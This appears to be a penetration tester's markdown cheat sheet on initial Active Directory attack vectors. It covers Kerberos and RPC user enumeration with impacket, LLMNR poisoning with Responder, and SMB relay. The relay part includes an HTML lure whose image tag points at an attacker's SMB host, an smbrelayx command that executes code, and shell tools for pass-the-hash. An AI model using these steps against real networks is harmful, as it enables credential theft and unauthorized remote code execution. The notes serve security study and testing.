# Phase 0:  Initial attack vectors
---
## Navigation
- **[[#Services enumeration]]**
- **[[#Attacks]]**

---
# Services enumeration
## Kerberos
- [**Kerbrute**](https://github.com/ropnop/kerbrute)
```txt
go get github.com/ropnop/kerbrute
```
- [**RPC**](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)  -> [**Tool**](https://github.com/m4lal0/RPCrecon)
```txt
#Connecting
rpcclient <ip> -U <username>

#Enumerate domain users
enumdomusers

#Enumerate domain groups
enumdomgroups
```

---
# Attacks
## 1-Kerbrute
- **impacket-GetNPUsers**: Get users with disabled `Pre-authentication`.
 - **impacket-lookupsid**: Performs bruteforcing of Windows SID’s to identify users/groups on the remote target.
 - **impacket-GetUserSPNs**:  Find Service Principal Names that are associated with a normal user account.
 ```bash
 impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP> -request
 ```
 - **impacket-GetADUSers.py**: Gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. 
 -- *If no entries are returned that means users don’t have email addresses specified*.
 ```bash
 impacket-GetADUsers <DOMAIN>/<USER> -dc-ip <IP>
 ```
 - [**Impacket-Tools**](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
- [**Kerbrute CheatSheet**](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
---
## 2-LLMNR Poisoning
**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Microsoft Windows components that serve as alternate methods of host identification. **LLMNR is based upon the Domain Name System (DNS) format** and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.
But this method of host resolution has severe security impact, as when a non-existing host is searched using LLMNR method, it **broadcasts** the search request to every system connected to the local network. As a result, **if any of the systems in local network is somehow compromised by an attacker, it also receives the host search query and can send a response to the victim** (the system which initiated the host resolution query) that it knows the host **and in turn ask for the password hash of the victim**.

![[LLMNR.png]]
### Exploitation
- Use responder to MITM and recieve the hash -> [**Responder.py**](https://github.com/SpiderLabs/Responder)
- [**Tool**](https://github.com/m4lal0/smbrelay)
### Mitigation
- See MITRE **[[#Refrences]]** below.
---
## 3-SMB  Relay attack
SMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.
Instead of cracking the NTLM hashes taken from the LLMNR poisoning attack or any other method we can authenticate using the hash using SMB relay attack but this requires two conditions:
- The victim user must be a local admin.
- SMB signing must be disabled.
### Checking if SMB signing id disabled
```bash 
nmap -p 445 10.0.0.6 -sS --script smb-security-mode.nse
```
### Exploitation
- Either by waiting for somenone to mistyping a domain or by sending an html payload file
#### HTML payload file
```html
<html>
    <h1>holla good sir</h1>
    <img src="file://10.0.0.5/download.jpg">
</html>
```
####  Tool
```bash
smbrelayx.py -h 10.0.0.6 -c "ipconfig" # 'c' is optional to execute commands.
```
### Gaining an shell
```bash
#Tools (Require password)
wmiexec #-> stealthier (Can be used to PASSTHEHASH and get a shell)
psexec #-> stealthier
smbexec #-> not stealthy
```
---
## 4-IPv6 DNS Takeover
Useful and important
- [Delegation attack](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
- [Attack](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

## Refrence
- [**BLOG Explaning various techniques**](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
- [**LLMNR Poison MITRE**](https://attack.mitre.org/techniques/T1557/001/) **&**  [**LLMNR Poison Meduim**](https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef)
- [**SMB Relay**](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing)